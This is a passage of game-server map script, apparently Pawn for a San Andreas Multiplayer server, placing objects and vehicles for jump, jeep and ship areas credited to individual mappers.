	CreateSObject(7191, 2974.759033, -1753.017700, 18.365240, 0.0000, 0.0000, 261.1648,object_show_distance,0,world_purim);
	CreateSObject(7191, 2966.040283, -1822.739990, 18.359453, 0.0000, 0.0000, 79.8237,object_show_distance,0,world_purim);
	CreateSObject(7191, 2943.465088, -1748.676514, 18.522036, 0.0000, 0.0000, 261.1648,object_show_distance,0,world_purim);
	CreateSObject(7191, 2932.251953, -1816.899536, 18.359453, 0.0000, 0.0000, 80.6830,object_show_distance,0,world_purim);
	CreateSObject(8229, 2919.425293, -1754.855347, 19.086006, 0.0000, 0.0000, 262.0242,object_show_distance,0,world_purim);
	CreateSObject(8229, 2911.945068, -1802.440430, 19.086006, 0.0000, 0.0000, 259.4459,object_show_distance,0,world_purim);
	CreateSObject(3472, 2898.889404, -1774.943604, 17.097103, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(9833, 2915.381592, -1767.906982, 19.607168, 0.0000, 0.0000, 343.6707,object_show_distance,0,world_purim);
	CreateSObject(9833, 2912.001465, -1788.701172, 19.590549, 0.0000, 0.0000, 347.1084,object_show_distance,0,world_purim);
	CreateSObject(3374, 2973.627441, -1782.487549, 17.709494, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2973.578613, -1782.507202, 20.706282, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2973.519043, -1782.455811, 23.706282, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2973.485596, -1782.431152, 26.706282, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2973.510254, -1782.429443, 29.659355, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2974.891113, -1772.795166, 29.584045, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2973.993652, -1780.475220, 29.670151, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2974.302490, -1778.379150, 29.648666, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2975.907959, -1756.062134, 17.712278, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2975.263672, -1760.147827, 17.809538, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2974.692871, -1764.159424, 17.884537, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2974.538818, -1764.207031, 20.884537, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2974.536865, -1764.229980, 23.884537, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2974.583008, -1764.172852, 26.884537, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2974.635498, -1764.122070, 29.784538, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2975.996338, -1756.065186, 20.712278, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2975.990723, -1756.071655, 23.712278, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2975.992920, -1756.077759, 26.712278, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2976.009766, -1756.097290, 29.712278, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2975.645752, -1760.167358, 29.612564, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(8229, 2903.074219, -1788.847168, 19.010769, 0.0000, 0.0000, 167.4860,object_show_distance,0,world_purim);
	CreateSObject(8229, 2906.703125, -1762.869263, 19.010448, 0.0000, 0.0000, 349.5829,object_show_distance,0,world_purim);
	CreateSObject(9339, 2995.255371, -1768.162109, 17.040155, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(9339, 2988.527832, -1814.067017, 16.836887, 0.0000, 0.0000, 350.5462,object_show_distance,0,world_purim);
	CreateSObject(18090, 2934.577881, -1801.454956, 18.948143, 0.0000, 0.0000, 262.8837,object_show_distance,0,world_purim);
	CreateSObject(14537, 2953.794434, -1784.770996, 18.331137, 0.0000, 0.0000, 352.2651,object_show_distance,0,world_purim);
	CreateSObject(14835, 2911.601318, -1773.283813, 17.959442, 0.0000, 0.0000, 350.5462,object_show_distance,0,world_purim);
	CreateSObject(14832, 2953.544678, -1785.925659, 18.459900, 0.0000, 0.0000, 173.5021,object_show_distance,0,world_purim);
	CreateSObject(3503, 2943.434814, -1795.571533, 18.660030, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(14608, 2938.682129, -1765.665161, 18.655790, 0.0000, 0.0000, 127.0925,object_show_distance,0,world_purim);
	CreateSObject(7073, 2961.225098, -1753.885864, 34.657310, 0.0000, 0.0000, 32.6586,object_show_distance,0,world_purim);
	CreateSObject(2780, 2948.807617, -1784.241089, 20.282749, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(2780, 2938.863037, -1764.445801, 20.337582, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(2780, 2934.334717, -1799.981689, 19.926626, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(3461, 2874.222656, -1770.284424, 15.901511, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(3461, 2950.431152, -1777.052490, 17.959787, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(3461, 2950.878906, -1775.267822, 17.965572, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(3461, 2948.297852, -1789.728516, 17.959787, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(3461, 2948.086426, -1791.825073, 17.959787, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(7392, 2955.265381, -1814.759644, 26.104851, 0.0000, 0.0000, 303.2772,object_show_distance,0,world_purim);
	CreateSObject(3472, 2935.386963, -1781.375122, 16.753933, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(2780, 2934.951904, -1781.156494, 27.330999, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(1570, 2947.157715, -1765.659180, 17.736284, 0.0000, 0.0000, 347.1084,object_show_distance,0,world_purim);
	CreateSObject(990, 2889.074463, -1782.794678, 17.479977, 0.0000, 0.0000, 303.2772,object_show_distance,0,world_purim);
	CreateSObject(990, 2891.643311, -1763.959717, 17.463499, 0.0000, 0.0000, 217.3335,object_show_distance,0,world_purim);
	#endif
	// Jumping (StreeTBoy):
	CreateSObject(8040, 3885.223389, -1530.219238, 704.122009, 0.0000, 0.0000, 191.2501);
	CreateSObject(18450, 3806.934814, -1545.427490, 702.982483, 0.0000, 0.0000, 11.2500);
	CreateSObject(18450, 3747.195801, -1557.295410, 669.319580, 0.0000, 302.4177, 11.2500);
	CreateSObject(18450, 3705.341309, -1565.631470, 602.107178, 0.0000, 302.4177, 11.2500);
	CreateSObject(18450, 3663.251953, -1573.994873, 534.589233, 0.0000, 302.4177, 11.2500);
	CreateSObject(18450, 3621.273438, -1582.354370, 472.491577, 0.0000, 306.7149, 11.2500);
	CreateSObject(18450, 3574.546387, -1591.658569, 408.519287, 0.0000, 306.7149, 11.2500);
	CreateSObject(18450, 3528.379150, -1600.811768, 356.401123, 0.0000, 317.0282, 11.2500);
	CreateSObject(18450, 3476.304199, -1611.222656, 309.536774, 0.0000, 321.3253, 11.2500);
	CreateSObject(18450, 3415.681885, -1623.296631, 266.677155, 0.0000, 329.9197, 11.2500);
	CreateSObject(1634, 3377.506836, -1634.941772, 245.889740, 336.7952, 358.2811, 100.3906);
	CreateSObject(1634, 3369.174561, -1636.533691, 248.346405, 3.4377, 0.0000, 101.2500);
	CreateSObject(18450, 3220.203857, -1656.407104, 227.258698, 0.0000, 357.4217, 11.2500);
	CreateSObject(1634, 3376.759277, -1631.002197, 245.995682, 336.7952, 359.1406, 100.3906);
	CreateSObject(1634, 3368.413330, -1632.633911, 248.395676, 2.5783, 359.1406, 101.2500);
	CreateSObject(1634, 3375.965576, -1626.931030, 246.086441, 336.7952, 358.2811, 100.3906);
	CreateSObject(1634, 3367.627197, -1628.659912, 248.458740, 2.5783, 359.1406, 101.2500);
	CreateSObject(18450, 3223.341553, -1672.043213, 227.379303, 0.0000, 357.4217, 11.2500);
	CreateSObject(18450, 3147.018799, -1670.945923, 205.974640, 0.0000, 330.7792, 11.2500);
	CreateSObject(18450, 3150.474854, -1686.530151, 206.100784, 0.0000, 330.7792, 11.2500);
	CreateSObject(7979, 3042.785400, -1702.707886, 149.767624, 333.3575, 0.0000, 101.2500);
	CreateSObject(18450, 3079.806641, -1684.354736, 167.700134, 0.0000, 330.7792, 11.2500);
	CreateSObject(18450, 3082.947510, -1699.952759, 167.613098, 0.0000, 330.7792, 11.2500);
	CreateSObject(7979, 3041.361816, -1696.051392, 149.650070, 333.3575, 0.0000, 101.2500);
	CreateVehicleEx(522,3857.7856,-1550.8798,703.9276,12.0286,6,1); //
	CreateVehicleEx(522,3853.4426,-1551.9116,703.9268,7.8246,76,0); //
	CreateVehicleEx(522,3861.5535,-1550.1127,703.9302,11.6712,7,0); //
	CreateVehicleEx(522,3864.1946,-1549.5844,703.9280,9.8505,2,0); //
	CreateVehicleEx(522,3867.7686,-1549.1432,703.9272,10.5498,0,1); //
	CreateVehicleEx(411,3866.8254,-1529.9749,704.0834,190.4384,6,0); //
	CreateVehicleEx(411,3868.3264,-1537.7561,704.0835,10.7018,7,0); //
	CreateVehicleEx(451,3871.4458,-1536.9347,704.0632,10.8769,6,1); //
	CreateVehicleEx(451,3870.0085,-1529.5417,704.0603,191.4383,7,0); //
	CreateVehicleEx(541,3873.4321,-1532.6234,704.1569,282.1507,7,6); //
	CreateVehicleEx(437,3873.5212,-1516.6271,704.4967,101.5323,7,6); //
	CreateVehicleEx(444,3878.9512,-1547.4751,704.7277,100.4477,6,7); //
	CreateVehicleEx(503,3863.5669,-1534.7335,704.3381,102.8009,7,6); //
	CreateVehicleEx(539,3851.2449,-1553.0870,703.7165,12.1950,7,6); //
	CreateVehicleEx(545,3873.7627,-1548.1235,704.1674,11.0932,1,1); //
	// Jeeps (Zryex):
	CreateSObject(3749, 288.602051, 1411.666504, 15.224235, 0.0000, 0.0000, 270.0000);
	CreateSObject(988, 288.509094, 1400.807007, 9.940793, 0.0000, 0.0000, 90.0000);
	CreateSObject(3528, 292.527191, 1410.947876, 16.278873, 0.0000, 0.0000, 0.0000);
	CreateSObject(13831, 253.039459, 1399.433350, 17.477303, 0.0000, 0.0000, 90.0000);
	CreateVehicleEx(495,286.5555,1338.4353,10.9360,359.8662,0,0); //
	CreateVehicleEx(495,282.4435,1338.3922,10.9456,359.7206,32,4); //
	CreateVehicleEx(495,278.3704,1338.4781,10.9504,359.2666,1,3); //
	CreateVehicleEx(495,274.4276,1338.4695,10.9565,357.3469,54,5); //
	CreateVehicleEx(495,270.7538,1338.7089,10.9464,358.2767,9,2); //
	CreateVehicleEx(495,284.6323,1350.8197,10.9352,359.5128,0,0); //
	CreateVehicleEx(495,280.2811,1350.7972,10.9361,358.6922,3,9); //
	CreateVehicleEx(495,276.4202,1350.9337,10.9361,358.0885,56,0); //
	CreateVehicleEx(495,272.5804,1350.8914,10.9372,357.3590,98,1); //
	CreateVehicleEx(470,287.4274,1360.7889,10.5795,359.6938,2,3); //
	CreateVehicleEx(470,282.7343,1360.7207,10.5785,359.8867,0,0); //
	CreateVehicleEx(470,279.1594,1360.8000,10.5788,359.9326,0,0); //
	CreateVehicleEx(470,275.2357,1360.8959,10.5789,358.7628,0,0); //
	CreateVehicleEx(470,270.6340,1360.9817,10.5790,358.0621,0,0); //
	CreateVehicleEx(490,273.3626,1370.9097,10.7230,356.9892,24,4); //
	CreateVehicleEx(490,285.3553,1370.6353,10.7134,359.6643,1,1); //
	CreateVehicleEx(490,276.9409,1370.8584,10.7135,359.7392,86,0); //
	CreateVehicleEx(490,280.8665,1370.9026,10.7132,359.2138,80,0); //
	CreateVehicleEx(434,260.0457,1338.5111,10.5508,359.3665,0,0); //
	CreateVehicleEx(434,257.3296,1338.4991,10.5516,359.5768,0,0); //
	CreateVehicleEx(434,254.5797,1338.4258,10.5503,359.4775,0,0); //
	CreateVehicleEx(471,286.5595,1396.2014,10.0672,91.6228,6,1); //
	CreateVehicleEx(471,286.5356,1398.1044,10.0672,95.1742,73,1); //
	CreateVehicleEx(471,286.6691,1394.1025,10.0674,91.1706,62,1); //
	CreateVehicleEx(468,286.7740,1389.0105,10.2506,95.7911,6,6); //
	CreateVehicleEx(468,286.8582,1386.7097,10.2548,95.3175,1,1); //
	CreateVehicleEx(468,287.0432,1384.0590,10.2549,91.8244,0,0); //
	CreateVehicleEx(433,284.5149,1479.7474,11.0227,180.0438,0,0); //
	CreateVehicleEx(433,279.0236,1479.7727,11.0226,179.9017,0,0); //
	CreateVehicleEx(406,281.7140,1465.9232,12.1143,91.2408,0,0); //
	CreateVehicleEx(406,282.0053,1457.0869,12.1117,89.6732,0,0); //
	CreateVehicleEx(486,283.6757,1449.3561,10.8061,91.3650,0,0); //
	CreateVehicleEx(486,283.8845,1443.4829,10.8057,90.5397,0,0); //
	// Ships (Mr_CooL):
	CreateSObject(6295, 2389.614502, 551.360046, 30.188646, 0.0000, 0.0000, 90.0000);
	CreateSObject(3505, 2294.152588, 541.673096, 0.788849, 0.0000, 0.0000, 0.0000);
	CreateSObject(3505, 2293.986328, 532.254211, 0.788849, 0.0000, 0.0000, 0.0000);
	CreateSObject(3505, 2293.682129, 522.971375, 0.788849, 0.0000, 0.0000, 0.0000);
	CreateSObject(3505, 2359.926025, 542.000122, 0.791348, 0.0000, 0.0000, 0.0000);
	CreateSObject(3505, 2359.607666, 533.326904, 0.791348, 0.0000, 0.0000, 0.0000);
	CreateSObject(3505, 2360.120117, 523.299561, 0.791348, 0.0000, 0.0000, 0.0000);
	CreateSObject(9833, 2302.716553, 547.164124, 9.983793, 0.0000, 0.0000, 22.5000);
	CreateSObject(9833, 2285.012451, 547.278442, 9.983793, 0.0000, 0.0000, 22.5000);
	CreateSObject(9833, 2350.916504, 547.228088, 9.707760, 0.0000, 0.0000, 33.7500);
	CreateSObject(9833, 2367.745605, 548.744934, 9.758797, 0.0000, 0.0000, 303.7500);
	CreateSObject(3374, 2300.412598, 605.102417, 11.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2304.340332, 605.016174, 11.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2308.278809, 604.920959, 11.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2308.269043, 604.968933, 14.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2308.279785, 604.991821, 17.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2304.336426, 605.037354, 17.352762, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2300.472656, 605.041809, 17.314255, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2300.462646, 605.050598, 20.314255, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2300.525146, 605.067749, 23.314255, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2304.481201, 605.042664, 23.370403, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2308.287842, 605.066589, 23.374231, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2314.400146, 604.985962, 11.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2314.430176, 604.962646, 14.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2314.499756, 604.970093, 17.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2314.525635, 604.965210, 20.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2314.537354, 604.965210, 23.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2318.305664, 604.967590, 17.320669, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2322.235352, 604.953369, 17.188955, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2322.275879, 604.982178, 20.188955, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2322.235352, 604.965881, 23.188955, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2322.254150, 604.968018, 14.339262, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2322.260986, 604.917053, 11.414288, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2328.223145, 605.046021, 11.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2328.205322, 605.041687, 14.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2328.247070, 605.104797, 17.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2328.235352, 605.104126, 20.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2328.206787, 605.366089, 22.964291, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2334.465820, 605.127258, 11.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2334.477051, 605.145813, 14.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2334.534180, 605.153015, 17.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2334.543457, 605.035950, 20.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2334.556396, 605.003845, 22.914295, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2338.427002, 605.014648, 22.909525, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2341.431885, 605.011230, 22.957399, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2341.420654, 605.101318, 19.939283, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2341.431152, 605.113098, 17.015451, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2338.495605, 605.173950, 17.072220, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2347.304932, 604.872253, 11.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2351.229004, 604.821106, 11.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2355.099609, 604.728394, 11.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2355.072998, 604.707092, 14.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2355.056396, 604.707397, 17.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2351.219971, 604.690735, 17.315481, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2347.358643, 604.713135, 17.314274, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2347.306152, 604.711121, 20.114277, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2347.345947, 604.692322, 22.814281, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2351.073975, 604.651123, 22.815481, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2354.869141, 604.636414, 22.812229, 0.0000, 0.0000, 0.0000);
	CreateSObject(14608, 2324.131104, 543.999146, 1.478979, 0.0000, 0.0000, 135.0000);
	CreateSObject(6295, 2244.152100, 551.483276, 30.712597, 0.0000, 0.0000, 270.0000);
	CreateSObject(16782, 2386.254150, 551.216492, 9.420858, 0.0000, 0.0000, 180.0000);
	CreateSObject(16782, 2247.546631, 551.664368, 9.922960, 0.0000, 0.0000, 0.0000);
	CreateSObject(2600, 2314.487305, 546.150085, 7.698096, 0.0000, 0.0000, 0.0000);
	CreateSObject(2600, 2337.714600, 546.062439, 7.698096, 0.0000, 0.0000, 0.0000);
	CreateSObject(3877, 2392.452393, 593.778687, 11.487961, 0.0000, 0.0000, 0.0000);
	CreateSObject(3877, 2392.337891, 569.966675, 11.487961, 0.0000, 0.0000, 0.0000);
	CreateSObject(3877, 2371.559570, 599.098877, 11.488251, 0.0000, 0.0000, 0.0000);
	CreateSObject(3877, 2297.853760, 599.154663, 11.488251, 0.0000, 0.0000, 0.0000);
	CreateSObject(3877, 2276.952393, 599.130859, 11.487961, 0.0000, 0.0000, 0.0000);
	CreateSObject(3877, 2257.805664, 599.120117, 11.487961, 0.0000, 0.0000, 0.0000);
	CreateSObject(3877, 2241.468506, 593.764526, 11.487961, 0.0000, 0.0000, 0.0000);
	CreateSObject(3877, 2241.554443, 570.063843, 11.487961, 0.0000, 0.0000, 0.0000);
	CreateSObject(14781, 2247.135742, 588.551697, 7.870562, 0.0000, 0.0000, 0.0000);
	CreateSObject(14781, 2247.041504, 574.628906, 7.871599, 0.0000, 0.0000, 0.0000);
	CreateSObject(14781, 2385.824219, 587.385498, 7.870560, 0.0000, 0.0000, 0.0000);
	CreateSObject(14781, 2385.864014, 575.725586, 7.820560, 0.0000, 0.0000, 0.0000);
	CreateSObject(3819, 2239.176270, 575.254517, 10.819978, 0.0000, 0.0000, 180.0000);
	CreateSObject(3819, 2239.257080, 588.730713, 10.819978, 0.0000, 0.0000, 180.0000);
	CreateSObject(3819, 2395.022949, 576.236206, 10.819978, 0.0000, 0.0000, 0.0000);
	CreateSObject(3819, 2394.781006, 587.959534, 10.819978, 0.0000, 0.0000, 0.0000);
	CreateSObject(13592, 2181.3046875, 434.4189453125, 8.2638025283813, 0, 0, 0);
	CreateSObject(1634, 2185.75390625, 495.2197265625, 1.0249999761581, 0, 0, 87.73681640625);
	CreateSObject(1634, 2185.669921875, 491.0859375, 1, 0, 0, 87.73681640625);
	CreateSObject(1225, 2169.4780273438, 493.25482177734, 27.26166343689, 0, 0, 0);
	CreateSObject(1225, 2168.9270019531, 490.09329223633, 27.493465423584, 0, 0, 0);
	CreateSObject(1225, 2168.193359375, 485.1796875, 23.776557922363, 0, 0, 0);
	CreateSObject(1225, 2169.0859375, 485.25, 18.372783660889, 0, 0, 0);
	CreateSObject(1225, 2169.7333984375, 498.81292724609, 22.564153671265, 0, 0, 0);
	CreateSObject(1225, 2169.6899414063, 498.88986206055, 18.153697967529, 0, 0, 0);
	CreateSObject(1225, 2168.9470214844, 487.47787475586, 26.509231567383, 0, 0, 0);
	CreateSObject(1225, 2169.0769042969, 496.49157714844, 25.379411697388, 0, 0, 0);
	CreateSObject(1225, 2168.5688476563, 486.83251953125, 12.35000038147, 0, 0, 0);
	CreateSObject(1225, 2169.7041015625, 497.48770141602, 12.012033462524, 0, 0, 0);
	CreateSObject(1225, 2168.9782714844, 490.30862426758, 7.9146871566772, 0, 0, 0);
	CreateSObject(1225, 2169.2707519531, 494.70825195313, 7.9086894989014, 0, 0, 0);
	CreateSObject(2780, 2181.0046386719, 433.83578491211, 19.562740325928, 0, 0, 0);
	CreateSObject(3374, 2075.1728515625, 468.64294433594, 1.3750003576279, 0, 0, 348.09008789063);
	CreateSObject(3374, 2065.2270507813, 485.48986816406, 1.2500026226044, 0, 0, 348.08532714844);
	CreateSObject(3374, 2030.1754150391, 471.72326660156, 1.3000005483627, 0, 0, 348.08532714844);
	CreateSObject(3374, 2049.1696777344, 474.82019042969, 1.1999996900558, 0, 0, 348.08532714844);
	CreateSObject(3374, 2015.6793212891, 496.40948486328, 1.3630930185318, 0, 0, 348.08532714844);
	CreateSObject(3528, 2189.806640625, 431.79290771484, 16.780055999756, 0, 0, 344.1201171875);
	CreateSObject(3374, 2000.8165283203, 473.91278076172, 1.2999993562698, 0, 0, 348.08532714844);
	CreateSObject(3877, 2182.3811035156, 489.55502319336, 1.7064551115036, 0, 0, 0);
	CreateSObject(3877, 2182.6025390625, 497.0673828125, 1.800325512886, 0, 0, 0);
	CreateSObject(3877, 2182.515625, 493.259765625, 1.7457776069641, 0, 0, 0);
	CreateSObject(3877, 2182.5673828125, 495.927734375, 1.7551873922348, 0, 0, 0);
	CreateSObject(3877, 2182.515625, 494.62109375, 1.7726343870163, 0, 0, 0);
	CreateSObject(3877, 2182.4897460938, 491.93145751953, 1.78087246418, 0, 0, 0);
	CreateSObject(3877, 2182.3203125, 490.79699707031, 1.7747544050217, 0, 0, 0);
	CreateSObject(7073, 2183.2788085938, 434.67715454102, 37.923980712891, 0, 0, 0);
	CreateSObject(1225, 2075.3276367188, 468.51016235352, 2.0999984741211, 0, 0, 0);
	CreateSObject(1225, 2065.802734375, 484.94720458984, 2.0100030899048, 0, 0, 0);
	CreateSObject(1225, 2049.4892578125, 474.96252441406, 1.6867743730545, 0, 0, 0);
	CreateSObject(1225, 2030.2730712891, 472.02584838867, 2.0117745399475, 0, 0, 0);
	CreateSObject(1225, 2015.8682861328, 496.42614746094, 2.0998668670654, 0, 0, 0);
	CreateSObject(1225, 2000.8182373047, 473.89498901367, 2.0367774963379, 0, 0, 0);
	CreateSObject(3374, 1979.5419921875, 479.45468139648, 1.3629987239838, 0, 0, 358.01025390625);
	CreateSObject(3374, 1979.3909912109, 475.55279541016, 1.3867441415787, 0, 0, 358.00598144531);
	CreateSObject(3374, 1979.603515625, 483.06146240234, 1.2749993801117, 0, 0, 358.00598144531);
	CreateSObject(3374, 1979.6185302734, 486.95040893555, 1.149999499321, 0, 0, 358.00598144531);
	CreateSObject(3374, 1979.6600341797, 490.66488647461, 1.0499995946884, 0, 0, 358.00598144531);
	CreateSObject(3374, 1979.3021240234, 471.56811523438, 1.3749996423721, 0, 0, 358.00598144531);
	CreateSObject(3374, 1979.1849365234, 467.53353881836, 1.4499992132187, 0, 0, 358.00598144531);
	CreateSObject(3374, 1979.0853271484, 463.4866027832, 1.499999165535, 0, 0, 358.00598144531);
	CreateSObject(3374, 1978.9149169922, 459.57321166992, 1.4171469211578, 0, 0, 358.00598144531);
	CreateSObject(3374, 1978.7727050781, 455.64694213867, 1.3999992609024, 0, 0, 358.00598144531);
	CreateSObject(3374, 1980.1037597656, 508.95568847656, 1.3750005960464, 0, 0, 358.00598144531);
	CreateSObject(3374, 1980.2153320313, 512.94195556641, 1.4149959087372, 0, 0, 358.00598144531);
	CreateSObject(3374, 1980.3762207031, 516.86206054688, 1.2750012874603, 0, 0, 358.00598144531);
	CreateSObject(3374, 1980.4049072266, 520.60693359375, 1.2999993562698, 0, 0, 358.00598144531);
	CreateSObject(3374, 1980.5327148438, 524.61370849609, 1.2334170341492, 0, 0, 358.00598144531);
	CreateSObject(3374, 1980.58203125, 528.60858154297, 1.1250033378601, 0, 0, 358.00598144531);
	CreateSObject(3374, 1980.7419433594, 532.57348632813, 1.0749995708466, 0, 0, 358.00598144531);
	CreateSObject(3374, 1980.7708740234, 536.55950927734, 0.99999958276749, 0, 0, 358.00598144531);
	CreateSObject(3374, 1980.9138183594, 540.52618408203, 0.97499966621399, 0, 0, 358.00598144531);
	CreateSObject(3374, 1978.6862792969, 452.08453369141, 1.3749992847443, 0, 0, 358.00598144531);
	CreateSObject(3374, 1978.5174560547, 447.90682983398, 1.3499993085861, 0, 0, 358.00598144531);
	CreateSObject(3374, 1978.3356933594, 443.87274169922, 1.2999993562698, 0, 0, 358.00598144531);
	CreateSObject(3374, 1980.9610595703, 544.54107666016, 0.9499996304512, 0, 0, 358.00598144531);
	CreateSObject(3374, 1981.1696777344, 548.53448486328, 0.89999967813492, 0, 0, 358.00598144531);
	CreateSObject(3374, 1981.2237548828, 552.486328125, 0.91428256034851, 0, 0, 358.00598144531);
	CreateSObject(3374, 1981.3155517578, 555.29034423828, 0.85000050067902, 0, 0, 358.00598144531);
	CreateSObject(1225, 1979.0473632813, 444.24719238281, 1.1523276567459, 0, 0, 0);
	CreateSObject(1225, 1979.0385742188, 448.28424072266, 1.8191726207733, 0, 0, 0);
	CreateSObject(1225, 1979.2987060547, 452.34744262695, 2.1117732524872, 0, 0, 0);
	CreateSObject(1225, 1979.2750244141, 455.73687744141, 2.1117730140686, 0, 0, 0);
	CreateSObject(1225, 1979.3568115234, 458.56057739258, 2.1539208889008, 0, 0, 0);
	CreateSObject(1225, 1978.8615722656, 461.76284790039, 2.1367726325989, 0, 0, 0);
	CreateSObject(1225, 1979.1591796875, 465.5700378418, 2.136773109436, 0, 0, 0);
	CreateSObject(1225, 1979.3745117188, 469.89154052734, 1.9367731809616, 0, 0, 0);
	CreateSObject(1225, 1979.4107666016, 473.87005615234, 2.0735177993774, 0, 0, 0);
	CreateSObject(1225, 1979.484375, 476.56015014648, 2.1235179901123, 0, 0, 0);
	CreateSObject(1225, 1979.6882324219, 482.6067199707, 1.9867733716965, 0, 0, 0);
	CreateSObject(1225, 1979.5708007813, 479.04760742188, 2.0747725963593, 0, 0, 0);
	CreateSObject(1225, 1979.8435058594, 487.88848876953, 1.8367742300034, 0, 0, 0);
	CreateSObject(1225, 1979.5747070313, 490.65417480469, 1.7617747783661, 0, 0, 0);
	CreateSObject(1225, 1979.9447021484, 508.79711914063, 2.0367741584778, 0, 0, 0);
	CreateSObject(1225, 1980.0504150391, 513.12054443359, 2.0267722606659, 0, 0, 0);
	CreateSObject(1225, 1980.3831787109, 516.33905029297, 1.9367753267288, 0, 0, 0);
	CreateSObject(1225, 1980.5559082031, 521.87347412109, 2.011773109436, 0, 0, 0);
	CreateSObject(1225, 1981.1633300781, 533.09143066406, 1.7367745637894, 0, 0, 0);
	CreateSObject(1225, 1981.0665283203, 538.62750244141, 1.2117750644684, 0, 0, 0);
	CreateSObject(1225, 1981.4949951172, 541.95587158203, 1.6617751121521, 0, 0, 0);
	CreateSObject(1225, 1981.4737548828, 545.77075195313, 1.636775135994, 0, 0, 0);
	CreateSObject(1225, 1981.4011230469, 550.50140380859, 1.5760582685471, 0, 0, 0);
